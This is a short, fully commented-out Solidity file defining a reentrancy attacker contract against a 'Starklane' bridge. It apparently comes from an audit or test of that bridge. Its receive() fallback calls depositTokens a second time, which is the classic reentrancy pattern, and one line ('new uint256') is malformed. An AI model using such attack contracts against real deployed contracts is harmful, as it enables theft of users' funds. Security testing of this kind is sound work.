// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "../src/Bridge.sol";

// contract ReentrancyAttacker {
//     Starklane public starklane;
//     address public victim;
//     bool public attackTriggered;

//     constructor(address _starklane, address _victim) {
//         starklane = Starklane(_starklane);
//         victim = _victim;
//     }

//     receive() external payable {
//         if (!attackTriggered) {
//             attackTriggered = true;
//             uint256[] memory ids = new uint256[](1);
//             ids[0] = 0;
//             starklane.depositTokens{value: 30000}(0x1, victim, ids, false);
//         }
//     }

//     function attack() external payable {
//         starklane.depositTokens{value: 30000}(0x1, victim, new uint256, false);
//     }
// }
